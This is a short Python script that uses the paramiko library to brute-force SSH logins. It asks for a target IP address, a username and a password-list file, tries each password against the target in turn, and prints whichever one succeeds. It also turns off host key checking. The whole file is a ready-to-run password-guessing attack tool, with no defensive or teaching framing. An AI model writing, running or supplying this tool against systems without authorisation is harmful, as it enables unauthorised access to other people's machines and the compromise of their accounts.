import paramiko

def brute_force_ssh(target, username, password_list):
    for password in password_list:
        try:
            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            client.connect(target, username=username, password=password)
            print(f"Password found: {password}")
            client.close()
            return password
        except paramiko.AuthenticationException:
            continue
    print("No valid password found.")
    return None

if __name__ == "__main__":
    target = input("Enter the target IP address: ")
    username = input("Enter the username: ")
    password_file = input("Enter the path to the password list: ")
    
    with open(password_file, 'r') as file:
        passwords = file.read().splitlines()
    
    brute_force_ssh(target, username, passwords)